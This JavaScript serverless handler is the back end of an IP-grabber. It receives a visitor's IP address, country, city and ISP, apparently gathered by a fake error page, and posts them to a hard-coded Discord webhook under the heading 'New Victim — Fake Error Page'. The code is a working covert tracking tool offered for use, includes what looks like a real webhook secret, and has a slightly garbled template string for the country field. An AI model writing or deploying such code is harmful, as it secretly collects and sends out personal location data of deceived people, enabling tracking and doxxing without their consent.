export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { ip, country, flag, city, isp } = req.body;

  // YOUR REAL WEBHOOK URL — 100% HIDDEN (not in client code)
  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1441788885268041788/n17DxZidjM-rc_RldYGa_ROF4zzohKWlcK_ZhyY3-Cf07O0LJRPNE3XA4MmIleWdQQCM'

  const embed = {
    title: 'New Victim — Fake Error Page',
    color: 16711680,
    fields: [
      { name: 'IP', value: ip, inline: true },
      { name: 'Country', value: `\( {country} \){flag}`, inline: true },
      { name: 'City', value: city || 'Unknown', inline: true },
      { name: 'ISP', value: isp || 'Unknown', inline: true }
    ]
  };

  try {
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });
    res.status(200).json({ status: 'success' });
  } catch (error) {
    res.status(500).json({ error: 'Failed to log' });
  }
}
